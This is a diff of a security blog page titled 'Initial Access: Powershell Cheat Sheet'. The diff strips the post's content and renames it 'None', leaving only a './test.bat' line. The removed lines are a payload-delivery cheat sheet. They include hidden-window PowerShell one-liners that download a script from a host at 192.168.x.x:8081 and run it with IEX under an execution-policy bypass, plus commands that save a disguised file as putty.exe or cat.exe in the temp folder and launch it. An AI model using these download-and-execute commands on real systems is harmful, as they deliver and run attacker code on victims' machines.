@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Initial Access: Powershell Cheat Sheet – ThikLab - CyberSec</title>
+    <title>Initial Access: None – ThikLab - CyberSec</title>
     
 
 
@@ -1331,10 +1331,10 @@
 
 
     
-<meta name="description" content="របៀបទាញយក Payload គ្រប់ទម្រង់ដែលមាន" />
+<meta name="description" content="None" />
 
 
-<meta name="keywords" content="payload,powershell,vbscript,batch">
+<meta name="keywords" content="payload">
 
 <meta name="created" content="2025-05-16T13:00:00&#43;0700">
 <meta name="modified" content="2025-05-16T13:00:00&#43;0700">
@@ -1345,18 +1345,18 @@
 
 
 <meta property="og:site_name" content="ThikLab - CyberSec">
-<meta property="og:title" content="Initial Access: Powershell Cheat Sheet">
+<meta property="og:title" content="Initial Access: None">
 <meta property="og:url" content="https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="របៀបទាញយក Payload គ្រប់ទម្រង់ដែលមាន">
+<meta property="og:description" content="None">
 
   
     <meta property="og:image" content="https://th1k.github.io/images/feature3/terminal.gif">
     <meta property="og:image:url" content="https://th1k.github.io/images/feature3/terminal.gif">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="ThikLab - CyberSec">
-    <meta property="twitter:title" content="Initial Access: Powershell Cheat Sheet">
-    <meta property="twitter:description" content="របៀបទាញយក Payload គ្រប់ទម្រង់ដែលមាន">
+    <meta property="twitter:title" content="Initial Access: None">
+    <meta property="twitter:description" content="None">
   
 
 <meta name="generator" content="Hugo 0.98.0" />
@@ -1394,12 +1394,12 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "Initial Access: Powershell Cheat Sheet",
+    "headline": "Initial Access: None",
     "datePublished": "2025-05-16T13:00:00+07:00",
     "dateModified": "2025-05-16T13:00:00+07:00",
     "url" : "https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/",
-    "description": "របៀបទាញយក Payload គ្រប់ទម្រង់ដែលមាន",
-    "keywords": ["payload","powershell","vbscript","batch"],
+    "description": "None",
+    "keywords": ["payload"],
     "image" : "https://th1k.github.io/images/feature3/terminal.gif",
     "author": {
       "@type": "Person",
@@ -1714,7 +1714,7 @@
   
   <li  class="is-active" >
     
-      <span>Initial Access: Powershell Cheat Sheet</span>
+      <span>Initial Access: None</span>
     
   </li>
   
@@ -1726,7 +1726,7 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">Initial Access: Powershell Cheat Sheet</h2>
+    <h2 class="single__title" data-ani="true">Initial Access: None</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
@@ -1750,69 +1750,21 @@
 
   <li><a href="https://th1k.github.io/en/tags/payload/" class="single__tag" title="payload">#payload</a></li>
 
-  <li><a href="https://th1k.github.io/en/tags/powershell/" class="single__tag" title="powershell">#powershell</a></li>
-
-  <li><a href="https://th1k.github.io/en/tags/vbscript/" class="single__tag" title="vbscript">#vbscript</a></li>
-
-  <li><a href="https://th1k.github.io/en/tags/batch/" class="single__tag" title="batch">#batch</a></li>
-
 </ul>
 
     </div>
     <article class="single__contents" data-dir="ltr" data-ani="true">
       
-      <p>ខាងក្រោមនេះជាវិធីក្នុងការទាញយកនូវរាល់ Payloads ចេញពីអ៊ីនអឺណិត ។</p>
-<h4 id="based-on">Based On</h4>
+      <h4 id="none">None</h4>
 <ul>
 <li>PowerShell</li>
-<li>VBScript</li>
-<li>Batch Script</li>
 </ul>
-<h4 id="method-1---powershell-downloader">Method 1 - PowerShell Downloader</h4>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Download and Execute Payload (PS1)</span>
-</span></span><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.168.x.x:8081/test.ps1&#39;)&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-nop</span> <span class="n">-w</span> <span class="n">hidden</span> <span class="n">-c</span> <span class="s2">&#34;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.x.x:8081/test.ps1&#39;))&#34;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c"># ./test.ps1 =&gt; Start-Process &#39;C:\windows\system32\calc.exe&#39;</span></span></span></code></pre></td></tr></table>
-</div>
-</div>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Download/Save/Execute</span>
-</span></span><span class="line"><span class="cl"><span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">&#39;http://192.168.x.x:8081/cat.jpg&#39;</span><span class="p">,</span><span class="s1">&#39;%temp%\putty.exe&#39;</span><span class="p">);</span> <span class="nb">Start-Process</span> <span class="s1">&#39;%temp%\putty.exe&#39;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">PowerShell</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">ByPass</span> <span class="n">-NoProfile</span> <span class="nb">Start-BitsTransfer</span> <span class="n">-Source</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x:8081</span><span class="p">/</span><span class="n">cat</span><span class="p">.</span><span class="n">jpg</span> <span class="n">-Destination</span> <span class="nv">$env:temp</span><span class="p">\</span><span class="n">cat</span><span class="p">.</span><span class="n">exe</span><span class="p">;</span> <span class="nb">Start-Process</span> <span class="nv">$env:temp</span><span class="p">\</span><span class="n">cat</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></td></tr></table>
-</div>
-</div>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"></code></pre></td></tr></table>
-</div>
-</div>
-<h4 id="method-2---vbscript-downloader">Method 2 - VBScript Downloader</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="err">&#39;</span> <span class="n">Download</span> <span class="ow">and</span> <span class="n">Execute</span> <span class="n">Payload</span></span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">./test.bat</span></span></code></pre></td></tr></table>
 </div>
 </div>
 
@@ -2020,7 +1972,7 @@
       
     
       
-        <a href="https://twitter.com/intent/tweet?text=Initial%20Access%3a%20Powershell%20Cheat%20Sheet&url=https%3a%2f%2fth1k.github.io%2fen%2fposts%2finitial-access-powershell-cheat-sheet%2f&hashtags=payload%2cpowershell%2cvbscript%2cbatch&via=thik" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
+        <a href="https://twitter.com/intent/tweet?text=Initial%20Access%3a%20None&url=https%3a%2f%2fth1k.github.io%2fen%2fposts%2finitial-access-powershell-cheat-sheet%2f&hashtags=payload&via=thik" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
           <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
         </a>
       
@@ -2544,9 +2496,7 @@ document.addEventListener('DOMContentLoaded', function () {
       <ul>
         <li>
           <ul>
-            <li><a href="#based-on">Based On</a></li>
-            <li><a href="#method-1---powershell-downloader">Method 1 - PowerShell Downloader</a></li>
-            <li><a href="#method-2---vbscript-downloader">Method 2 - VBScript Downloader</a></li>
+            <li><a href="#none">None</a></li>
           </ul>
         </li>
       </ul>
